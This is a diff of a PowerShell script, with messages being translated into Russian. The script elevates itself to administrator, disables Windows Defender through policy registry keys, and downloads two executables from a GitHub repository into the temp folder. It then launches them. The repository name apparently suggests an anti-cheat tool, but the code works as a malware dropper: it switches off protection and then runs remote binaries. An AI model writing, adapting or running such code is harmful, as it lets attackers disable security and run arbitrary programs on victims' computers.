@@ -11,8 +11,7 @@ function Test-Admin {
 
 if ((Test-Admin) -eq $false) {
     if ($shouldAssumeToBeElevated) {
-        Write-Output "Elevating did not work :("
-        Read-Host "Press Enter to exit"
+        Write-Output "Повышение прав не сработало :("
         exit
     } else {
         Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
@@ -22,7 +21,7 @@ if ((Test-Admin) -eq $false) {
 
 Set-Location "$workingDirOverride"
 
-Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow
+Write-Host "=== Отключение Windows Defender ===" -ForegroundColor Yellow
 
 $DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
 $RealTimeProtectionKey = "Real-Time Protection"
@@ -35,16 +34,13 @@ New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction Silent
 try {
     Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
     Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
-    Write-Host "Windows Defender DISABLED" -ForegroundColor Green
+    Write-Host "Windows Defender ОТКЛЮЧЕН" -ForegroundColor Green
 } catch {
-    Write-Host "Failed to set registry values: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Ошибка установки реестра: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 Write-Host ""
-Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
-
-# ПРИНУДИТЕЛЬНО ВКЛЮЧАЕМ TLS 1.2 (ОБЯЗАТЕЛЬНО ДЛЯ GITHUB)
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
+Write-Host "=== Скачивание и запуск файлов ===" -ForegroundColor Yellow
 
 $temp = $env:TEMP
 $downloaded = 0
@@ -56,101 +52,93 @@ function Download-File {
         Remove-Item $dest -Force -ErrorAction SilentlyContinue 
     }
     
-    Write-Host "Downloading from: $url" -ForegroundColor Gray
-    Write-Host "This may take up to 30 seconds..." -ForegroundColor Gray
-    
-    # Используем .NET WebClient с таймаутом
     try {
+        Write-Host "Скачивание с: $url" -ForegroundColor Gray
+        # Используем WebClient вместо BITS (не зависает)
         $webClient = New-Object System.Net.WebClient
-        $webClient.Timeout = 30000  # 30 секунд таймаут
-        
-        # Добавляем User-Agent (некоторые серверы требуют)
-        $webClient.Headers.Add("User-Agent", "PowerShell-Download-Script")
-        
-        # Скачиваем
         $webClient.DownloadFile($url, $dest)
         $webClient.Dispose()
-        
-        # Проверяем результат
-        if (Test-Path $dest) {
-            $size = (Get-Item $dest).Length
-            if ($size -gt 0) {
-                Write-Host "SUCCESS: $([math]::Round($size/1KB, 2)) KB downloaded" -ForegroundColor Green
-                return $true
-            } else {
-                Write-Host "ERROR: Downloaded file is empty" -ForegroundColor Red
-                return $false
-            }
-        } else {
-            Write-Host "ERROR: File not created" -ForegroundColor Red
+        return $true
+    } catch {
+        Write-Host "WebClient ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
+        try {
+            # Альтернативный метод
+            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+            return $true
+        } catch {
+            Write-Host "Invoke-WebRequest ошибка: $($_.Exception.Message)" -ForegroundColor DarkYellow
             return $false
         }
-    } catch {
-        Write-Host "DOWNLOAD FAILED: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
     }
 }
 
 # Проверка интернета с таймаутом
-Write-Host "Checking internet connection..." -ForegroundColor Gray
 try {
-    $ping = Test-Connection -ComputerName "github.com" -Count 1 -Quiet -TimeoutSeconds 5
-    if ($ping) {
-        Write-Host "Internet: OK" -ForegroundColor Green
-    } else {
-        Write-Host "Internet: Warning - GitHub may be slow" -ForegroundColor Yellow
-    }
+    $request = [System.Net.WebRequest]::Create("https://github.com")
+    $request.Timeout = 5000
+    $request.GetResponse() | Out-Null
+    Write-Host "Интернет соединение: OK" -ForegroundColor Green
 } catch {
-    Write-Host "Internet: Check skipped" -ForegroundColor Gray
+    Write-Host "ВНИМАНИЕ: Нет интернета: $($_.Exception.Message)" -ForegroundColor Red
 }
 
 $url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
 $dest1 = "$temp\proga1.exe"
 
-Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
+Write-Host "`n[1/2] Скачивание proga1.exe..." -ForegroundColor Cyan
 if (Download-File $url1 $dest1) {
-    $downloaded++
+    if ((Get-Item $dest1).Length -gt 0) {
+        Write-Host "УСПЕХ: proga1.exe скачан ($([math]::Round((Get-Item $dest1).Length / 1KB, 2)) KB)" -ForegroundColor Green
+        $downloaded++
+    } else {
+        Write-Host "ОШИБКА: proga1.exe пустой" -ForegroundColor Red
+    }
 } else {
-    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
+    Write-Host "ОШИБКА: proga1.exe" -ForegroundColor Red
 }
 
 $url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
 $dest2 = "$temp\proga2.exe"
 
-Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
+Write-Host "`n[2/2] Скачивание proga2.exe..." -ForegroundColor Cyan
 if (Download-File $url2 $dest2) {
-    $downloaded++
-} else {
-    Write-Host "WARNING: proga2.exe not found, creating copy..." -ForegroundColor Yellow
-    if (Test-Path $dest1) {
-        Copy-Item $dest1 $dest2 -Force
-        Write-Host "Created proga2.exe as copy of proga1.exe" -ForegroundColor Green
+    if ((Get-Item $dest2).Length -gt 0) {
+        Write-Host "УСПЕХ: proga2.exe скачан ($([math]::Round((Get-Item $dest2).Length / 1KB, 2)) KB)" -ForegroundColor Green
         $downloaded++
     } else {
-        Write-Host "ERROR: Cannot create proga2.exe" -ForegroundColor Red
+        Write-Host "ОШИБКА: proga2.exe пустой" -ForegroundColor Red
+    }
+} else {
+    Write-Host "ПРЕДУПРЕЖДЕНИЕ: proga2.exe не найден на сервере" -ForegroundColor Yellow
+    if (Test-Path $dest1) {
+        Copy-Item $dest1 $dest2 -Force
+        Write-Host "Создан proga2.exe как копия proga1.exe" -ForegroundColor Green
+        $downloaded++
+    } else {
+        Write-Host "ОШИБКА: Нельзя создать proga2.exe (proga1.exe отсутствует)" -ForegroundColor Red
     }
 }
 
 Write-Host ""
-Write-Host "=== Running Files ===" -ForegroundColor Yellow
+Write-Host "=== Запуск файлов ===" -ForegroundColor Yellow
 
 if (Test-Path $dest1) {
-    Write-Host "Starting proga1.exe..." -ForegroundColor Green
+    Write-Host "Запуск proga1.exe..." -ForegroundColor Green
     Start-Process -FilePath $dest1 -WindowStyle Normal
 } else {
-    Write-Host "proga1.exe not found!" -ForegroundColor Red
+    Write-Host "proga1.exe не найден!" -ForegroundColor Red
 }
 
 if (Test-Path $dest2) {
-    Start-Sleep -Seconds 2
-    Write-Host "Starting proga2.exe..." -ForegroundColor Green
+    Start-Sleep -Seconds 1
+    Write-Host "Запуск proga2.exe..." -ForegroundColor Green
     Start-Process -FilePath $dest2 -WindowStyle Normal
 } else {
-    Write-Host "proga2.exe not found!" -ForegroundColor Red
+    Write-Host "proga2.exe не найден!" -ForegroundColor Red
 }
 
 Write-Host ""
-Write-Host "=== ALL DONE ($downloaded/2 files processed) ===" -ForegroundColor Green
+Write-Host "=== ГОТОВО ($downloaded/2 файлов обработано) ===" -ForegroundColor Green
 Write-Host ""
-Write-Host "Press any key to exit..." -ForegroundColor Gray
+Write-Host "Нажмите любую клавишу для выхода..." -ForegroundColor Gray
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
